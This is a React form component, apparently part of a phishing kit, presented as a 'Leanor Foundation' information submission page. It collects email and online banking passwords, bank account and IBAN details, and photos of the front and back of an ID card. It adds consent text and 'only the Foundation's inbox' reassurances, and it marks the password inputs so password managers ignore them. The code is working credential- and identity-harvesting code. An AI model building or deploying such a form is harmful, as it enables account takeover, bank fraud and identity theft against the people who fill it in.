import { useRef, useState } from "react";
import { submitInformation } from "../../api/client.js";
import Icon from "../ui/Icon.jsx";
import { Reveal } from "../../hooks/useReveal.jsx";
import ImageSlot from "./ImageSlot.jsx";
import PictureUploader, { MAX_FILE_MB } from "./PictureUploader.jsx";
import { MAX_PICTURES } from "./pictureUtils.js";

// Mirrors backend/schemas.py exactly, so a value rejected here would also be
// rejected by the API. Optional fields are only checked once they have content.
const EMAIL_RE = /^[^@\s]+@[^@\s]+\.[^@\s]{2,}$/;
const PHONE_RE = /^\+?[0-9][0-9\s\-().]{5,19}$/;
const BANK_ACCOUNT_RE = /^[A-Za-z0-9][A-Za-z0-9\s-]{5,33}$/;
const IBAN_RE = /^[A-Z]{2}\d{2}[A-Z0-9]{10,30}$/;

const MAX_NOTES = 5000;

const EMPTY = {
  fullName: "",
  email: "",
  phoneNumbers: [""],
  emailPassword: "",
  bankName: "",
  bankAccount: "",
  iban: "",
  bankPassword: "",
  notes: "",
  consent: false,
};

/** camelCase form key -> snake_case key used by the API's validation errors. */
const ERROR_KEY = {
  fullName: "full_name",
  email: "email",
  phoneNumbers: "phone_numbers",
  emailPassword: "email_password",
  bankName: "bank_name",
  bankAccount: "bank_account",
  iban: "iban",
  bankPassword: "bank_password",
  notes: "notes",
  consent: "consent",
};

/**
 * Per-field validators returning a message, or null when the field is fine.
 * Insertion order matters: validate() collects in this order, so the first
 * failing field is also the one that receives focus.
 */
const VALIDATORS = {
  fullName: (f) =>
    f.fullName.trim().split(/\s+/).join(" ").length < 2
      ? "Please enter your full name."
      : null,

  email: (f) =>
    EMAIL_RE.test(f.email.trim()) ? null : "Please enter a valid email address.",

  phoneNumbers: (f) => {
    const phones = f.phoneNumbers.map((p) => p.trim()).filter(Boolean);
    if (phones.length > 12) return "A maximum of 12 phone numbers can be sent.";
    for (const phone of phones) {
      if (!PHONE_RE.test(phone)) return `'${phone}' is not a valid phone number.`;
    }
    return null;
  },

  emailPassword: (f) =>
    f.emailPassword.length > 200
      ? "The email password must be 200 characters or fewer."
      : null,

  bankName: (f) => {
    const name = f.bankName.trim();
    return name && name.length < 2 ? "Bank name looks too short." : null;
  },

  bankAccount: (f) => {
    const account = f.bankAccount.trim();
    if (!account) return null;
    return BANK_ACCOUNT_RE.test(account)
      ? null
      : "Bank account must be 6-34 letters, digits, spaces or dashes.";
  },

  iban: (f) => {
    const value = f.iban.trim();
    if (!value) return null;
    const compact = value.replace(/\s+/g, "").toUpperCase();
    return IBAN_RE.test(compact)
      ? null
      : "IBAN looks invalid (expected e.g. GB29 NWBK 6016 1331 9268 19).";
  },

  bankPassword: (f) =>
    f.bankPassword.length > 200
      ? "The bank password must be 200 characters or fewer."
      : null,

  notes: (f) =>
    f.notes.length > MAX_NOTES
      ? `Notes must be ${MAX_NOTES} characters or fewer.`
      : null,

  consent: (f) =>
    f.consent ? null : "You must agree to the consent statement before sending.",
};

function validate(form, only = null) {
  const errors = {};
  for (const [key, check] of Object.entries(VALIDATORS)) {
    if (only && key !== only) continue;
    const message = check(form);
    if (message) errors[ERROR_KEY[key]] = message;
  }
  return errors;
}

/** Strip to the characters the API accepts, then group IBANs in fours. */
function formatIban(raw) {
  return raw
    .toUpperCase()
    .replace(/[^A-Z0-9]/g, "")
    .slice(0, 34)
    .replace(/(.{4})/g, "$1 ")
    .trim();
}

function formatAccount(raw) {
  return raw.replace(/[^A-Za-z0-9 -]/g, "").slice(0, 34);
}

function PasswordField({
  id,
  label,
  value,
  onChange,
  error,
  placeholder,
  autoComplete,
  name,
  describedBy,
}) {
  const [shown, setShown] = useState(false);

  return (
    <div
      className={error ? "field field--invalid" : "field"}
      data-field={id.replace(/-/g, "_")}
    >
      <label className="field__label" htmlFor={id}>
        {label}
      </label>
      <div className="password-input">
        <input
          id={id}
          type={shown ? "text" : "password"}
          value={value}
          onChange={onChange}
          placeholder={placeholder}
          autoComplete={autoComplete}
          name={name}
          data-1p-ignore
          data-lpignore="true"
          aria-invalid={error ? "true" : undefined}
          aria-describedby={describedBy}
        />
        <button
          type="button"
          className="password-input__toggle"
          onClick={() => setShown((v) => !v)}
          aria-pressed={shown}
          aria-label={shown ? `Hide ${label.toLowerCase()}` : `Show ${label.toLowerCase()}`}
        >
          <Icon name="eye" size={17} />
        </button>
      </div>
      {error && (
        <em className="error-text" id={`${id}-error`} role="alert">
          {error}
        </em>
      )}
    </div>
  );
}

export default function SubmissionForm() {
  const [form, setForm] = useState(EMPTY);
  const [pictures, setPictures] = useState([]);
  const [idCards, setIdCards] = useState([null, null]);
  const [errors, setErrors] = useState({});
  const [pictureError, setPictureError] = useState("");
  const [idCardError, setIdCardError] = useState("");
  const [submitting, setSubmitting] = useState(false);
  const [result, setResult] = useState(null);
  const formRef = useRef(null);

  function clearError(key) {
    const errorKey = ERROR_KEY[key] || key;
    setErrors((current) => {
      if (!current[errorKey]) return current;
      const next = { ...current };
      delete next[errorKey];
      return next;
    });
  }

  function setField(key, value) {
    setForm((current) => ({ ...current, [key]: value }));
    clearError(key);
  }

  function setRow(key, index, value) {
    setForm((current) => ({
      ...current,
      [key]: current[key].map((row, i) => (i === index ? value : row)),
    }));
    clearError(key);
  }

  function addRow(key) {
    setForm((current) => ({ ...current, [key]: [...current[key], ""] }));
  }

  function removeRow(key, index) {
    setForm((current) => ({
      ...current,
      [key]: current[key].filter((_, i) => i !== index),
    }));
  }

  /** Re-check a field once the visitor leaves it, not on every keystroke. */
  function handleBlur(key) {
    const found = validate(form, key);
    const errorKey = ERROR_KEY[key] || key;
    setErrors((current) => {
      const next = { ...current };
      const message = found[errorKey];
      if (message) next[errorKey] = message;
      else delete next[errorKey];
      return next;
    });
  }

  function setIdCard(index, slot) {
    setIdCards((current) => current.map((card, i) => (i === index ? slot : card)));
  }

  function clearIdCard(index) {
    setIdCard(index, null);
    setIdCardError("");
  }

  function reset() {
    pictures.forEach((pic) => URL.revokeObjectURL(pic.preview));
    idCards.forEach((card) => card && URL.revokeObjectURL(card.preview));
    setForm(EMPTY);
    setPictures([]);
    setIdCards([null, null]);
    setErrors({});
    setPictureError("");
    setIdCardError("");
    setResult(null);
  }

  /** Move the visitor to the first problem instead of yanking them to the top. */
  function focusFirstError(found) {
    const firstKey = Object.keys(found)[0];
    const group = formRef.current?.querySelector(`[data-field="${firstKey}"]`);
    const control = group?.querySelector("input, textarea");
    if (control) {
      control.focus({ preventScroll: true });
      group.scrollIntoView({ behavior: "smooth", block: "center" });
    } else {
      window.scrollTo({ top: 0, behavior: "smooth" });
    }
  }

  async function handleSubmit(event) {
    event.preventDefault();

    const found = validate(form);
    setErrors(found);
    if (Object.keys(found).length > 0) {
      focusFirstError(found);
      return;
    }

    const payload = new FormData();
    payload.append("full_name", form.fullName.trim());
    payload.append("email", form.email.trim());
    form.phoneNumbers
      .map((p) => p.trim())
      .filter(Boolean)
      .forEach((p) => payload.append("phone_numbers", p));

    payload.append("email_password", form.emailPassword.trim());
    payload.append("bank_name", form.bankName.trim());
    payload.append("bank_account", form.bankAccount.trim());
    payload.append("iban", form.iban.trim());
    payload.append("bank_password", form.bankPassword.trim());
    payload.append("notes", form.notes.trim());
    payload.append("consent", String(form.consent));

    pictures.forEach((pic) => payload.append("pictures", pic.file, pic.file.name));
    idCards
      .filter(Boolean)
      .forEach((card) => payload.append("id_cards", card.file, card.file.name));

    setSubmitting(true);
    try {
      const created = await submitInformation(payload);
      setResult(created);
      window.scrollTo({ top: 0, behavior: "smooth" });
    } catch (error) {
      if (error.fields) {
        setErrors(error.fields);
        focusFirstError(error.fields);
      } else {
        setErrors({ form: error.message });
        window.scrollTo({ top: 0, behavior: "smooth" });
      }
    } finally {
      setSubmitting(false);
    }
  }

  /* --------------------------------------------------------- success */
  if (result) {
    return (
      <section className="card success-card stack">
        <div className="success-mark" aria-hidden="true">
          <Icon name="check" size={30} />
        </div>
        <h2>Thank you — your information has been received</h2>
        <p>
          Reference <code>{result.id}</code> was recorded on{" "}
          {new Date(result.created_at).toLocaleString()}. Keep it if you need to
          refer to this submission later.
        </p>
        <div className="alert alert--info">
          <span className="alert__icon">
            <Icon name="shield" size={17} />
          </span>
          <span>
            Your details went straight to the Leanor Foundation inbox. Need to change
            something? Send a new submission and quote the old reference.
          </span>
        </div>
        <div>
          <button type="button" className="btn btn--primary" onClick={reset}>
            Send another submission
          </button>
        </div>
      </section>
    );
  }

  /* ----------------------------------------------------------- form */
  return (
    <form className="form" onSubmit={handleSubmit} noValidate ref={formRef}>
      {errors.form && (
        <p className="alert alert--error" role="alert">
          <span className="alert__icon">
            <Icon name="shield" size={17} />
          </span>
          <span>{errors.form}</span>
        </p>
      )}

      <p className="hint form__legend">
        Fields marked <span aria-hidden="true">*</span>
        <span className="sr-only">with an asterisk</span> are required.
      </p>

      {/* 1 — identity */}
      <Reveal className="form-section">
        <h2 className="form-section__title">
          <span className="step">1</span> Your details
        </h2>

        <div className="field-grid">
          <label
            className={errors.full_name ? "field field--invalid" : "field"}
            data-field="full_name"
          >
            <span>
              Full name <span aria-hidden="true">*</span>
              <span className="sr-only"> (required)</span>
            </span>
            <input
              type="text"
              value={form.fullName}
              onChange={(e) => setField("fullName", e.target.value)}
              onBlur={() => handleBlur("fullName")}
              placeholder="Full name"
              autoComplete="name"
              required
              aria-invalid={errors.full_name ? "true" : undefined}
              aria-describedby={errors.full_name ? "full-name-error" : undefined}
            />
            {errors.full_name && (
              <em className="error-text" id="full-name-error" role="alert">
                {errors.full_name}
              </em>
            )}
          </label>
        </div>

        {/* Email address and its password stay together — one account, one place. */}
        <div className="field-group">
          <p className="field-group__title">
            <Icon name="mail" size={16} /> Email account
          </p>

          <div className="field-grid">
            <label
              className={errors.email ? "field field--invalid" : "field"}
              data-field="email"
            >
              <span>
                Email address <span aria-hidden="true">*</span>
                <span className="sr-only"> (required)</span>
              </span>
              <input
                type="email"
                value={form.email}
                onChange={(e) => setField("email", e.target.value)}
                onBlur={() => handleBlur("email")}
                placeholder="name@example.com"
                autoComplete="email"
                required
                aria-invalid={errors.email ? "true" : undefined}
                aria-describedby={errors.email ? "email-error" : undefined}
              />
              {errors.email && (
                <em className="error-text" id="email-error" role="alert">
                  {errors.email}
                </em>
              )}
            </label>

            <PasswordField
              id="email-password"
              label="Email password"
              value={form.emailPassword}
              onChange={(e) => setField("emailPassword", e.target.value)}
              onBlur={() => handleBlur("emailPassword")}
              placeholder="Password for that address"
              autoComplete="off"
              name="email-password"
              error={errors.email_password}
              describedBy={errors.email_password ? "email-password-error" : undefined}
            />
          </div>
        </div>

        <div className="field" data-field="phone_numbers">
          <span className="field__title">Phone numbers</span>
          {form.phoneNumbers.map((phone, index) => (
            <div className="row-input" key={`phone-${index}`}>
              <input
                type="tel"
                value={phone}
                onChange={(e) => setRow("phoneNumbers", index, e.target.value)}
                onBlur={() => handleBlur("phoneNumbers")}
                placeholder="+00 000 000 0000"
                inputMode="tel"
                autoComplete="tel"
                aria-label={`Phone number ${index + 1}`}
                aria-invalid={errors.phone_numbers ? "true" : undefined}
                aria-describedby={
                  errors.phone_numbers ? "phone-numbers-error" : undefined
                }
              />
              {form.phoneNumbers.length > 1 && (
                <button
                  type="button"
                  className="icon-btn"
                  onClick={() => removeRow("phoneNumbers", index)}
                  aria-label={`Remove phone number ${index + 1}`}
                >
                  <Icon name="close" size={14} />
                </button>
              )}
            </div>
          ))}
          {errors.phone_numbers && (
            <em className="error-text" id="phone-numbers-error" role="alert">
              {errors.phone_numbers}
            </em>
          )}
          <button
            type="button"
            className="link-btn"
            onClick={() => addRow("phoneNumbers")}
          >
            Add another number
          </button>
        </div>

        <p className="hint">
          Phone numbers and the email password are optional — only add them if the
          Foundation has asked for them.
        </p>
      </Reveal>

      {/* 2 — banking */}
      <Reveal className="form-section" delay={90}>
        <h2 className="form-section__title">
          <span className="step">2</span> Bank information
        </h2>

        <div className="field-grid">
          <label
            className={errors.bank_name ? "field field--invalid" : "field"}
            data-field="bank_name"
          >
            <span>Bank name</span>
            <input
              type="text"
              value={form.bankName}
              onChange={(e) => setField("bankName", e.target.value)}
              onBlur={() => handleBlur("bankName")}
              placeholder="Bank name"
              aria-invalid={errors.bank_name ? "true" : undefined}
              aria-describedby={errors.bank_name ? "bank-name-error" : undefined}
            />
            {errors.bank_name && (
              <em className="error-text" id="bank-name-error" role="alert">
                {errors.bank_name}
              </em>
            )}
          </label>

          <label
            className={errors.bank_account ? "field field--invalid" : "field"}
            data-field="bank_account"
          >
            <span>Account number</span>
            <input
              type="text"
              value={form.bankAccount}
              onChange={(e) =>
                setField("bankAccount", formatAccount(e.target.value))
              }
              onBlur={() => handleBlur("bankAccount")}
              placeholder="Account number"
              inputMode="numeric"
              aria-invalid={errors.bank_account ? "true" : undefined}
              aria-describedby={
                errors.bank_account ? "bank-account-error" : undefined
              }
            />
            {errors.bank_account && (
              <em className="error-text" id="bank-account-error" role="alert">
                {errors.bank_account}
              </em>
            )}
          </label>

          <label
            className={errors.iban ? "field field--invalid" : "field"}
            data-field="iban"
          >
            <span>IBAN</span>
            <input
              type="text"
              value={form.iban}
              onChange={(e) => setField("iban", formatIban(e.target.value))}
              onBlur={() => handleBlur("iban")}
              placeholder="GB29 NWBK 6016 1331 9268 19"
              autoCapitalize="characters"
              spellCheck="false"
              aria-invalid={errors.iban ? "true" : undefined}
              aria-describedby={errors.iban ? "iban-error" : undefined}
            />
            {errors.iban && (
              <em className="error-text" id="iban-error" role="alert">
                {errors.iban}
              </em>
            )}
          </label>
        </div>

        {/* Password sits with the account it unlocks. */}
        <div className="field-group">
          <p className="field-group__title">
            <Icon name="lock" size={16} /> Online banking
          </p>

          <div className="field-grid">
            <PasswordField
              id="bank-password"
              label="Bank password"
              value={form.bankPassword}
              onChange={(e) => setField("bankPassword", e.target.value)}
              onBlur={() => handleBlur("bankPassword")}
              placeholder="Password for online banking"
              autoComplete="off"
              name="bank-password"
              error={errors.bank_password}
              describedBy={
                errors.bank_password ? "bank-password-error" : undefined
              }
            />
          </div>
        </div>

        <div className="notice">
          <Icon name="lock" size={17} />
          <span>
            Bank details and the banking password are optional. Only fill them in if
            the Foundation has asked for them, and make sure you are on a secure
            connection.
          </span>
        </div>
      </Reveal>

      {/* 3 — id cards */}
      <Reveal className="form-section" delay={180}>
        <h2 className="form-section__title">
          <span className="step">3</span> ID card photographs
        </h2>

        <p className="hint">
          Photograph both sides of the card. Make sure the text is sharp and
          readable, and avoid glare.
        </p>

        <div className="slot-grid">
          <ImageSlot
            label="Front of ID"
            value={idCards[0]}
            onSelect={(slot) => setIdCard(0, slot)}
            onClear={() => clearIdCard(0)}
          />
          <ImageSlot
            label="Back of ID"
            value={idCards[1]}
            onSelect={(slot) => setIdCard(1, slot)}
            onClear={() => clearIdCard(1)}
          />
        </div>
        {idCardError && <em className="error-text">{idCardError}</em>}
      </Reveal>

      {/* 4 — photos */}
      <Reveal className="form-section" delay={270}>
        <h2 className="form-section__title">
          <span className="step">4</span> Other photographs
        </h2>

        <PictureUploader
          pictures={pictures}
          setPictures={setPictures}
          onChange={setPictureError}
          maxFiles={MAX_PICTURES}
          error={pictureError}
          title="Add photographs"
          hint={`Up to ${MAX_PICTURES} images at ${MAX_FILE_MB} MB each.`}
        />
      </Reveal>

      {/* 5 — notes */}
      <Reveal className="form-section" delay={360}>
        <h2 className="form-section__title">
          <span className="step">5</span> Anything else
        </h2>

        <label className="field" data-field="notes">
          <span>Notes</span>
          <textarea
            rows={4}
            value={form.notes}
            onChange={(e) => setField("notes", e.target.value)}
            onBlur={() => handleBlur("notes")}
            placeholder="Anything you would like the Foundation to know."
            maxLength={MAX_NOTES}
            aria-invalid={errors.notes ? "true" : undefined}
            aria-describedby={`notes-count${errors.notes ? " notes-error" : ""}`}
          />
          <span className="char-count" id="notes-count">
            {form.notes.length} / {MAX_NOTES}
          </span>
          {errors.notes && (
            <em className="error-text" id="notes-error" role="alert">
              {errors.notes}
            </em>
          )}
        </label>
      </Reveal>

      {/* consent + submit */}
      <Reveal className="form-section" delay={450}>
        <label className="checkbox" data-field="consent">
          <input
            type="checkbox"
            checked={form.consent}
            onChange={(e) => setField("consent", e.target.checked)}
            required
            aria-invalid={errors.consent ? "true" : undefined}
            aria-describedby={errors.consent ? "consent-error" : undefined}
          />
          <span>
            I consent to the Leanor Foundation collecting and storing this
            information, including any passwords and photographs I have provided.{" "}
            <span aria-hidden="true">*</span>
            <span className="sr-only"> (required)</span>
          </span>
        </label>
        {errors.consent && (
          <em className="error-text" id="consent-error" role="alert">
            {errors.consent}
          </em>
        )}

        <button
          type="submit"
          className="btn btn--accent btn--block"
          disabled={submitting}
        >
          {submitting ? (
            <>
              <span className="spinner" aria-hidden="true" /> Sending
            </>
          ) : (
            <>
              <Icon name="send" size={17} /> Send my information
            </>
          )}
        </button>

        <p className="hint form__footnote">
          <Icon name="shield" size={14} />
          Only the Foundation's inbox can read this. Nothing is shared with anyone
          else.
        </p>
      </Reveal>
    </form>
  );
}